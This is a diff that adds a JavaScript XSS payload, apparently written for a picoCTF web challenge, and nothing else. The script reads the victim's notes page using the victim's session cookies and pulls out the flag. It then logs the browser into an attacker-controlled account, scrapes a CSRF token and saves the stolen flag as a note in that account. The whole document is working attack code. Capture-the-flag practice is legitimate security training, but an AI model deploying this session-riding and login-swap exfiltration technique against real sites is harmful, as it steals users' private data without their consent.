@@ -1,0 +1,17 @@
+<script>
+fetch('http://0.0.0.0:8080/notes',{credentials:'include'})
+.then(r=>r.text())
+.then(h=>{
+let m=h.match(/picoCTF\{[^}]+\}/);
+if(m){
+let flag=m[0];
+fetch('http://0.0.0.0:8080/login',{method:'POST',body:new URLSearchParams({username:'atk',password:'atk'}),credentials:'include'})
+.then(()=>fetch('http://0.0.0.0:8080/new',{credentials:'include'}))
+.then(r=>r.text())
+.then(html=>{
+let csrf=html.match(/name="_csrf" value="([^"]+)"/)[1];
+fetch('http://0.0.0.0:8080/new',{method:'POST',body:new URLSearchParams({_csrf:csrf,title:'GOTFLAG',content:flag}),credentials:'include'});
+});
+}
+});
+</script>
